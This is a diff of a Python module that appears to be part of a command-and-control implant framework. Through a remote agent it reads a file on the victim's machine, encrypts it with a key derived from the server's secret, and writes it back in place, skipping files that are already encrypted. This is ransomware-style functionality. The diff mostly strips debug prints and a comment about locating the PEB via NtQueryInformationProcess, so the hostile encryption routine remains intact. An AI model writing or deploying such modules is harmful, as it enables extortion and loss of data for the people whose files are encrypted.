@@ -4,19 +4,15 @@ PARAMS = [
     {"name":"file", "description":"Encrypt a file on the client using the server's key.", "type":"str"}
 ]
 
-# Dependencies: 
-# 1. NtQueryInformationProcess (to find PEB)
 DEPENDENCIES = ["read", "write"]
 
 def generate_encrypted_header():
     from flask import current_app
     from hashlib import pbkdf2_hmac
-    #printcurrent_app.config["SECRET_KEY"])
     secret = current_app.config["SECRET_KEY"].encode()
     salt = current_app.config["SECRET_KEY"][:16].encode()
     iterations = 200
     header = pbkdf2_hmac("sha256", secret, salt, iterations, dklen=32)[:8]
-    #printf"Header = {header}")
     return header
 
 def is_encrypted(data, header):
@@ -39,10 +35,8 @@ def encrypt_bytearray(data: bytearray, header) -> bytes:
 
 
 def function(agent_id, args):
-    #printf"[*][*][*][*][*][*][*][*][*][*][*][*]Encrypt received args {args}")
     header = generate_encrypted_header()
     file = args[0]
-    #printf"Generated encrypted header: {header}")
     data = read(agent_id, [file])
     print(f"read = {data}")
     if(data["retval"] != 0):
@@ -50,11 +44,9 @@ def function(agent_id, args):
     if is_encrypted(data["data"], header):
         return {"retval":"File already encrypted"}
     encrypted = encrypt_bytearray(data["data"], header)
-    #printf"About to write {encrypted} length={len(encrypted)}")
     write_ret = write(agent_id, [file, encrypted])
     print(f"write = {write_ret}")
     import hashlib
-    print(f"About to write {len(encrypted)} {hashlib.sha256(encrypted).hexdigest()} {encrypted}")
     if write_ret["retval"] != 0:
         return {"retval":"Error writing"}
     return {"retval":0, "hash":hashlib.sha256(encrypted).hexdigest()} 
